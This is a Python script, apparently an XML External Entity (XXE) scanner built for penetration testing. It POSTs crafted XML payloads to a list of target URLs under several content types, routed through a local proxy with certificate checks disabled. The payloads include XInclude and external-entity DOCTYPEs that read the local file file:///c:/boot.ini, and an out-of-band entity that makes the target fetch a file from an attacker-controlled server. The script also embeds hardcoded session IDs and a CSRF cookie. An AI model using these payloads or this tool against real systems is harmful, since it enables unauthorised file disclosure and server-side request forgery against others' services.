import sys
import requests
from requests_toolbelt import MultipartEncoder
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


proxy = {"https":"http://127.0.0.1:8080"}


if len(sys.argv)==4: 
	urls=open(sys.argv[1],'r')
	myserv=sys.argv[2]
	target=sys.argv[3]
else:
	print("\n### Usage: python3 %s <url File> <localServer> <target>\n"%sys.argv[0])
	print(" ex; python3 %s urls https://attacker https://target/\n"%sys.argv[0])
	print("<Before running...Start proxy, start http/s (depending on target), run tail -f [server access logs] >")
	print("<My url file: I ran content discovery in Burp based of inferred links, then filtered by XML MIME type, svgs, post reqs, and multipart form reqs")
	sys.exit(1)


if "https" in target:
	ip=target.strip("https://")
else:
	ip=target.strip("http://")

ip=ip.strip("/")

def show_settings():
	print("[+] Starting XXE search with below configs\n")
	print("\t home server: %s"%myserv)
	print("\t target: %s"%target)
	print("\t target ip: %s"%ip)
	print("\t url file: %s"%sys.argv[1])
	print("\t proxy: %s"%proxy)
	waiting=input("[?] go? (y/n): ")
	if waiting.lower()=='n':
		print("[!] exiting...")
		sys.exit(1)
	else:
		print("[+] Starting....")

def sort_responses(status,url,results_dict):
	if not url in results_dict.values():
		results_dict[status].append(url)
	print("[-->] %s"%url)


def write_results(results_dict):
	resultsFile=open('xxeScan_Results','w')

	resultsFile.write("XXE SCAN RESULTS\n\n")
	for key,value in results_dict.items():
		resultsFile.write("\n<========= %s  =========>\n"%key)
		for url in results_dict[key]:
			resultsFile.write(url+"\n")

	resultsFile.close()

results_dict={200:[],401:[],403:[],404:[],405:[],412:[],502:[]}
contentTypes=['application/x-www-form-urlencoded','text/html','application/json','application/xml']

#https://portswigger.net/web-security/xxe#exploiting-xxe-to-retrieve-files
#https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing

payloads=["""
<?xml version="1.0" encoding="UTF-8"?><td>bar</td>
""","""
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///c:/boot.ini"/></foo>
""","""
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
<td>&xxe;</td>
""","""
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "%s/BLAHBITTY.txt" >]>
<foo>&xxe;</foo>
"""%myserv
]

show_settings()


ambra_sid="?sid=71b3751b-0185-4458-9d38-b3467c5e822c&uuid=78471fe9-4ba7-42d2-be56-61845d94102f"

logfile=open('xxeScan_log','w')

for url in urls.readlines():
	for ctype in contentTypes:
		headers={
		"Host": ip,
		"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0",
		"Accept": "*/*",
		"Origin": target,
		"Referer": target,
		"Cookie":"csrf_token=de476866-a5f1-46af-87e3-eeb21fb70de7-128; __stripe_mid=eb000e4a-dcae-4a09-94fe-696f18ad9db965e50a",
		"Content-Type":"%s"%ctype
		}

		for payload in payloads:

			try:
				req=requests.post(url.strip(),headers=headers,data=payload,proxies=proxy,verify=False, allow_redirects=False)
				logfile.write("[+] %s %s \n"%(req.status_code,req.url.strip()))
				sort_responses(req.status_code,req.url.strip(),results_dict)
				
				url2=url.strip()+ambra_sid
				req2=requests.post(url2,headers=headers,data=payload,proxies=proxy,verify=False, allow_redirects=False)
				logfile.write("[+] %s %s \n"%(req2.status_code,req2.url.strip()))
				sort_responses(req2.status_code,req2.url.strip(),results_dict)

			except:
				print("[!] Error with %s"%req.url.strip())
				continue



write_results(results_dict)
urls.close()
logfile.close()

print("[+] ...Done")
print("[] results file: xxeScan_Results")
print("[] log file: xxeScan_log")


